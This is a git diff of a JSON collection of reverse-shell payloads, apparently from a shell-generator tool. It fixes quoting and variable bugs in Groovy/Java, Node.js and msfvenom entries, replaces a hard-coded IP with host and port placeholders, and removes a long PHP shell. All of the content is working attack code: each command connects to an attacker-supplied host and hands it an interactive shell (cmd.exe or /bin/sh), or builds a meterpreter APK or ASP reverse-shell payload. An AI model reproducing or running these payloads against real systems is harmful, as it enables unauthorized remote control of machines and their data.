@@ -70,7 +70,7 @@
         ],
         "groovy": [
             {
-                "command": "int port={LPORT};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+                "command": "String host=\"{LHOST}\";\nint port={LPORT};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
                 "comments":""
             }
         ],
@@ -80,7 +80,7 @@
                 "comments":""
             },
             {
-                "command":"String host=\"{LHOST}\nint port={LPORT};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+                "command":"String host=\"{LHOST}\";\nint port={LPORT};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
                 "comments":""
             }
         ],
@@ -152,7 +152,7 @@
                 "comments":""
             },
             {
-                "command":"msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} R -o shell.apk",
+                "command":"msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -R -o shell.apk",
                 "comments":""
             },
             {
@@ -176,7 +176,7 @@
                 "comments":""
             },
             {
-                "command":"msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp -o shell.asp",
+                "command":"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f asp -o shell.asp",
                 "comments":""
             },
             {
@@ -238,7 +238,7 @@
                 "comments":""
             },
             {
-                "command": "(function(){\n\tvar net = require(\"net\"),\n\t\ttcp = require(\"child_process\"),\n\t\tsh = cp.spawn(\"/bin/sh\", []);\n\tvar client = new net.Socket();\n\tclient.connect({LPORT}, \"{LHOST}\", function(){\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t});\n\treturn /a/; // Prevents the Node.js application form crashing\n})();",
+                "command": "(function(){\n\tvar net = require(\"net\"),\n\t\tcp = require(\"child_process\"),\n\t\tsh = cp.spawn(\"/bin/sh\", []);\n\tvar client = new net.Socket();\n\tclient.connect({LPORT}, \"{LHOST}\", function(){\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t});\n\treturn /a/; // Prevents the Node.js application form crashing\n})();",
                 "comments":""
             }
         ],
@@ -298,10 +298,6 @@
             {
                 "command": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
                 "comments":"PHP passthru"
-            },
-            {
-                "command":"php -r '$s='127.0.0.1';$p=443;@error_reporting(0);@ini_set(\"error_log\",NULL);@ini_set(\"log_errors\",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open('/bin/sh$IFS-i',array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die('connection/closed');if(feof($p[1]))die('shell/not/response');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die(\"proc_open/disabled\");}}else{die(\"not/connect\");}'",
-                "comments":""
             }
         ],
         "powershell": [
